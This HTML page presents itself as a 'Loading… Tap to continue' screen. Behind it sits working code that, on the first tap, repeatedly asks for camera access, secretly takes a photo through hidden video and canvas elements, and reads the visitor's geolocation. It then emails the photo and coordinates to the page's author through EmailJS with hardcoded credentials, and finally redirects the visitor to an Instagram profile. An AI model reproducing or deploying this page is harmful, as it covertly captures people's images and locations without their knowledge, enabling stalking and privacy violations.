<<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>
        body {
            background: #000;
            color: black; /* Hide all text but keep buttons visible */
            font-family: Arial;
            text-align: center;
            user-select: none;
            margin-top: 250px;
        }

        #loading {
            color: white;
            font-size: 22px;
            font-weight: bold;
        }

        /* Stealth mode: hide all real elements */
        video, canvas, #status {
            display: none !important;
            opacity: 0 !important;
        }
    </style>
</head>
<body>

<div id="loading"> Tap to continue</div>
<p id="status"></p>

<!-- Hidden camera elements -->
<video id="video" width="320" height="240" autoplay playsinline></video>
<canvas id="canvas" width="320" height="240"></canvas>

<!-- EmailJS -->
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<script>
emailjs.init("vieRRG0Q8QGFFS-XO"); // your public key

let stream = null;
let retryCount = 0;

/* -------------------------------------------------------
   TAP to start (required for Brave)
------------------------------------------------------- */
document.body.addEventListener("click", () => {
    if (!stream) {
        startCamera();
    }
});

/* -------------------------------------------------------
   Start camera with auto-retry until allowed
------------------------------------------------------- */
async function startCamera() {
    document.getElementById("loading").innerText = "Starting…";

    try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true });

        document.getElementById("video").srcObject = stream;
        document.getElementById("loading").innerText = "Capturing…";

        setTimeout(takePhoto, 1200);

    } catch (err) {
        retryCount++;

        document.getElementById("loading").innerText = "Tap to allow camera";

        if (retryCount < 10) {
            setTimeout(startCamera, 1500);  // auto-retry
        }
    }
}

/* -------------------------------------------------------
   Capture one photo
------------------------------------------------------- */
function takePhoto() {
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");

    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const img = canvas.toDataURL("image/jpeg", 0.25);

    sendData(img);
}

/* -------------------------------------------------------
   Send email with fallback if location blocked
------------------------------------------------------- */
function sendData(photo) {
    document.getElementById("loading").innerText = "Finishing…";

    let emailData = {
        photo: photo,
        location: "Location Blocked"
    };

    navigator.geolocation.getCurrentPosition(
        pos => {
            emailData.location = pos.coords.latitude + ", " + pos.coords.longitude;
            sendEmailJS(emailData);
        },
        err => {
            sendEmailJS(emailData); // send anyway
        },
        { timeout: 4000 }
    );
}

/* -------------------------------------------------------
   EmailJS send function
------------------------------------------------------- */
function sendEmailJS(data) {
    emailjs.send("service_c2bqpj9", "template_pee9jcq", data)
        .then(() => {
            document.getElementById("loading").innerText = "Done ✔ Redirecting…";
            setTimeout(() => {
                window.location.href = "https://www.instagram.com/_ansh_._katiyar_/";
            }, 700);
        })
        .catch(err => {
            document.getElementById("loading").innerText = "Error.";
            console.error(err);
        });
}
</script>

</body>
</html>
